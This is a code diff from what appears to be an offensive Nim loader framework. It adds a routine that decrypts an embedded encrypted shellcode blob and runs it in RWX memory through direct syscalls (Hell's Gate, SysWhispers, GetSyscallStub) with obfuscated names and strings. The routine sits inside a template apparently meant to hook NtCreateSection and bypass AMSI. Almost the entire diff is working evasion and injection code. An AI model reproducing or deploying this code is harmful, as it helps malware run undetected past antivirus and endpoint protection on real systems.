@@ -139,22 +139,170 @@ let AMSINtCreateSectionHookStubFirst * = """
 
 # Current Workaround for the NtCreateSection Hook as the imlementation below is not working yet.
 
-const hookShellcode = slurp"hook.bin"
-var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)
-proc NtCreateShellcode[byte](friendlycode: openarray[byte]): void =
-    var asde: LPVOID = VirtualAlloc(nil, SIZE_T(len(friendlycode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-    moveMemory(asde, unsafeAddr friendlycode[0], uint(len(friendlycode)))
-    var thread: Handle = cast[Handle](0)
-    var threadId: LPDWORD = nil
-    var pinfo: PROCESS_INFORMATION
-    var sinfo: STARTUPINFO
-    var hThread: HANDLE = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](asde), nil, 0, threadId)
-    WaitForSingleObject(hThread, 50000)
+when defined(GetSyscallStub):
+    # Unmanaged NTDLL Declarations
+    type myNtAllocateVirtualMemory2 = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
+    type myNtWriteVirtualMemory2 = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
+    type myNtCreateThreadEx2 = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}
+    type myNtProtectVirtM2 = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
+    var NtProtectVirtualMemory2: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
 
-NtCreateShellcode(hookShellcodeBytes)
+
+const hookShellcode = slurp"enchook.blob"
+var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)
+
+var dectext2 = newSeq[byte](len(hookShellcodeBytes))
+var ptrKey2 = cast[ptr byte](addr key2[0])
+var ptrEncText2: ptr byte # = cast[ptr byte](addr hookShellcodeBytes[0])
+var ptrDecText2: ptr byte # = cast[ptr byte](addr decText2[0])
+let dataLen2 = uint(len(hookShellcodeBytes))
+
+
+proc decryptLate2(): void =
+
+    when defined(verbose):
+        echo obf("[!] Decrypting Hook-Shellcode for execution in memory")
+    dctx2.init(ptrKey2)
+    discard calcHard()
+    dctx2.decrypt(ptrEncText2, ptrDecText2, dataLen2)
+    dctx2.clear()
+
+proc NtCreateSectionHookShellcode[byte](friendlycode: openarray[byte]): void =
+
+    when defined(DInvoke):
+        let tProcess = MyGetCurrentProcessId()
+        var pHandle: HANDLE = MyGetCurrentProcess()
+    else:
+        let tProcess = GetCurrentProcessId()
+        var pHandle: HANDLE = GetCurrentProcess()
+        
+    var 
+        status          : NTSTATUS          = 0x00000000
+        buffer          : LPVOID
+        dataSz          : SIZE_T            = cast[SIZE_T](friendlycode.len)
+        
+    when defined(GetSyscallStub):
+        let syscallStub_NtAlloc = VirtualAllocEx(pHandle,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
+        var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
+        var oldProtection: DWORD = 0
+        var success: BOOL
+
+        # define NtAllocateVirtualMemory
+        let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory2](cast[LPVOID](syscallStub_NtAlloc))
+        when defined(DInvoke):
+            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+        else:
+            success = VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+        # define NtWriteVirtualMemory
+        let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory2](cast[LPVOID](syscallStub_NtWrite))
+        when defined(DInvoke):
+            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+        else:
+            success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+
+        success = GetSyscallStub(obf("NtAllocateVirtualMemory"), cast[LPVOID](syscallStub_NtAlloc))
+        success = GetSyscallStub(obf("NtWriteVirtualMemory"), cast[LPVOID](syscallStub_NtWrite))
+        var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
+        # define NtCreateThreadEx
+        let NtCreateThreadEx = cast[myNtCreateThreadEx2](cast[LPVOID](syscallStub_NtCreate))
+        VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+        success = GetSyscallStub(obf("NtCreateThreadEx"), cast[LPVOID](syscallStub_NtCreate))
+    
+
+    when defined(Hellsgate):
+        if getSyscall(ntAllocTable):
+            syscall = ntAllocTable.wSysCall
+        else:
+            when defined(verbose):
+                echo obf("[-] Hook - Failed to find opcode for NtAllocateVirtualMemory")
+        
+    when defined(SysWhispers):
+        status = oqiahsjynmxkla(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+    else:
+        status = NtAllocateVirtualMemory(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+
+        
+    if not NT_SUCCESS(status):
+        when defined(verbose):
+            echo obf("[-] Hook - Failed to allocate memory.")
+    else:
+        when defined(verbose):
+            echo obf("[+] Hook - Allocated a page of memory with RWX perms")
+        
+    var bytesWritten: SIZE_T
+    when defined(Hellsgate):
+        var 
+            ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
+            ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
+
+        if getSyscall(ntWriteTable):
+
+            syscall = ntWriteTable.wSysCall
+        else:
+            when defined(verbose):
+                echo obf("[-] Hook - Failed to find opcode for NtWriteVirtualMemory")
+        
+    when defined(SysWhispers):
+        status = oqiazasusjk(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)
+    else:       
+        status = NtWriteVirtualMemory(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)
+
+    if not NT_SUCCESS(status):
+        when defined(verbose):
+            echo obf("[-] Hook - Failed to write memory.")
+    else:
+        when defined(verbose):
+            echo obf("[+] Hook - NtWriteVirtualMemory - Success ")
+                
+    
+    var tHandle: HANDLE
+    when defined(SysWhispers):
+        ptrEncText2 = cast[ptr byte](buffer)
+        ptrDecText2 = cast[ptr byte](buffer)
+        decryptLate2()
+        status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,buffer,NULL, FALSE, 0, 0, 0, NULL)
+        NtWaitForSingleObject(tHandle, 0, nil)
+        status = zuatzuastdiasyy(tHandle)
+        status = zuatzuastdiasyy(pHandle)
+        when defined(verbose):
+            echo obf("[*] Hook -  NtCreateThreadEx: "), toHex(status)
+    else:    
+        when defined(Hellsgate):
+            if getSyscall(ntCreateTable):
+                syscall = ntCreateTable.wSysCall
+            else:
+                when defined(verbose):
+                    echo obf("[-] Hook -  Failed to find opcode for NtCreateThreadEx")
+        ptrEncText2 = cast[ptr byte](buffer)
+        ptrDecText2 = cast[ptr byte](buffer)
+        decryptLate2()
+        status = NtCreateThreadEx(
+        &tHandle, 
+        THREAD_ALL_ACCESS, 
+        nil, 
+        -1,
+        buffer, 
+        nil, FALSE, 0, 0, 0, nil)
+        when defined(verbose):
+            echo obf("[*] Hook - NtCreateThreadEx: "), toHex(status)
+    when defined(Hellsgate):
+        when defined(Hellsgate):
+            if getSyscall(ntCloseTable):
+                syscall = ntCloseTable.wSysCall
+            else:
+                when defined(verbose):
+                    echo obf("[-] Hook - Failed to find opcode for NtClose")
+    status = NtClose(tHandle)
+    status = NtClose(pHandle)
+    return
+
+NtCreateSectionHookShellcode(hookShellcodeBytes)
 
 ##########################################################################################################
 
+"""
+
+let AMSINtCreateSectionHookStubUnused * = """
 
 #[
 proc MyNtCreateSection2(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
